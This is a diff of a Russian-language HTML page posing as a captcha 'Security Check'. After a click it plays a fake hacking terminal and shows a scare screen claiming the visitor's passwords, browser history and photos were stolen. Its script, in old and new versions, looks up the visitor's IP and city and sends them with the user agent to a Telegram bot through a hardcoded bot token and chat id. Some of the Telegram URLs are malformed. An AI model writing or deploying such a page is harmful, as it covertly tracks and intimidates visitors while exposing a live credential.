@@ -4,19 +4,17 @@
     <meta charset="UTF-8">
     <title>Security Check</title>
     <style>
-        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; }
+        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: hidden; }
         #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
         .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
-        #terminal { display: none; padding: 20px; color: #0f0; font-family: monospace; line-height: 1.4; background: #000; height: 100vh; overflow: hidden; }
+        #terminal { display: none; padding: 20px; line-height: 1.2; height: 100vh; }
         #leak-box { display: none; padding: 20px; }
         .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
         .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; }
-        hr { border: 0; border-top: 2px solid red; margin: 15px 0; }
-        .alert-blink { color: red; animation: blink 1s infinite; font-weight: bold; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        .t-red { color: red; } .t-gold { color: gold; }
     </style>
 </head>
-<body> 
+<body>
     <div id="terminal"></div>
 
     <div id="captcha-box">
@@ -28,69 +26,74 @@
     <div id="leak-box">
         <div class="danger-ui">
             <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
-            <hr>
-            <p>> Статус: <span class="alert-blink">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
-            <p>> IP-адрес: <span id="user-ip" style="color: #fff;">Определение...</span></p>
-            <p>> Устройство: <span id="user-os" style="color: #fff;">Загрузка...</span></p>
-            <p>> Местоположение: <span id="user-geo" style="color: #fff;">Поиск...</span></p>
+            <hr color="red">
+            <p>> Статус: <span style="color:red; font-weight:bold;">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
+            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">Определение...</span></p>
+            <p>> Город: <span id="user-geo" style="color:#fff;">Поиск...</span></p>
+            <p>> Устройство: <span id="user-os" style="color:#fff;">Загрузка...</span></p>
             <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ:</p>
-            <ul>
-                <li>История браузера: получена (2,431 запись)</li>
-                <li>Пароли системы: извлечены (Chrome, Firefox)</li>
+            <ul style="color: #ff4d4d;">
+                <li>История браузера: извлечена (2,431 запись)</li>
+                <li>Пароли системы: получены (Chrome, FB, Gmail)</li>
                 <li>Личные фото/видео: синхронизация...</li>
             </ul>
         </div>
     </div>
 
     <script>
-        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
-        const chat_id = "-1003861311533";
-
         async function startHack() {
-         
             document.getElementById('captcha-box').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-          
-            const initialLog = `🔥 ПЕРЕХОД!\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`;
-            fetch(`https://api.telegram.org/bot{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(initialLog)}`);
-
             const lines = [
-                "> [SYSTEM] Инициализация взлома...",
-                "> [INFO] Обход reCAPTCHA v2... [OK]",
-                "> [CRITICAL] Доступ к ядру системы получен",
-                "> [INFO] Извлечение базы данных Chrome...",
-                "> [ALERT] Сжатие данных завершено. Отправка..."
+                "> [INIT] Инициализация протокола...", "> [SYSTEM] Поиск открытых портов...", 
+                "> [SUCCESS] Порт 8080 открыт", "> [INFO] Обход reCAPTCHA v2...", 
+                "> [SUCCESS] Токен верификации получен", "> [INFO] Инжект в процесс lsass.exe...", 
+                "> [WARNING] Defender обнаружил активность", "> [INFO] Использование эксплойта CVE-2024...", 
+                "> [SUCCESS] Defender отключен", "> [SYSTEM] Доступ к ядру системы...", 
+                "> [CRITICAL] Права ROOT получены", "> [INFO] Сканирование диска C:/...", 
+                "> [INFO] Чтение папки %APPDATA%...", "> [SUCCESS] База паролей извлечена", 
+                "> [INFO] Поиск банковских сертификатов...", "> [INFO] Доступ к камере получен", 
+                "> [SYSTEM] Начало копирования медиафайлов...", "> [INFO] Загрузка истории Chrome...", 
+                "> [SUCCESS] 47 паролей расшифровано", "> [INFO] Синхронизация с сервером...", 
+                "> [WARNING] Трафик зашифрован", "> [INFO] Подмена SSL сертификата...", 
+                "> [SUCCESS] Удаленный доступ активен", "> [FINISH] Удаление следов взлома...", 
+                "> [DONE] ПОЛНЫЙ ДОСТУП ПОЛУЧЕН."
             ];
 
-         
             for (let line of lines) {
                 let p = document.createElement('p');
-                p.innerText = line;
+                p.innerHTML = line;
+                if (line.includes("CRITICAL")) p.className = "t-red";
                 term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 150)); 
+                await new Promise(r => setTimeout(r, 160));  
             }
 
-         
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                const ipv4 = d.ip;
-
-                document.getElementById('user-ip').innerText = ipv4;
-                document.getElementById('user-os').innerText = navigator.platform;
-
-                const ipLog = `📍 IP ЖЕРТВЫ: ${ipv4}\n💻 Система: ${navigator.platform}`;
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(ipLog)}`);
-            } catch (e) {
-                document.getElementById('user-ip').innerText = "Ошибка сети";
-            }
-
-        
+            await sendFinalLogs();
             term.style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
+        }
+
+        async function sendFinalLogs() {
+            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
+            const chat_id = "-1003861311533";  
+            try {
+                const res = await fetch('https://ipapi.co');
+                const d = await res.json();
+                
+                document.getElementById('user-ip').innerText = d.ip;
+                document.getElementById('user-geo').innerText = d.city;
+                document.getElementById('user-os').innerText = navigator.platform;
+
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                await fetch(url);
+            } catch (e) {
+                const backup = encodeURIComponent(`⚠️ Переход!\n📱 ${navigator.userAgent}`);
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
+            }
         }
     </script>
 </body>
